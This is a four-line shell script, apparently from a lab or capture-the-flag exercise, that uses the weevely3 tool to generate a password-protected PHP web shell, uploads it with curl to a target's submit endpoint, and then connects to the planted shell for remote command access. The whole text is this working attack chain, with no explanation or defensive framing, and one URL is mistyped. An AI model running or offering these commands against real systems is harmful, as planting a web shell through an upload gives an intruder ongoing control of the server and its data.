
cd ~/weevely3

./weevely.py generate pass agent.php

curl -F 'file=@agent.php' http://$1:5000/submit

./weevely.py http:/$1:8000/agent.php pass



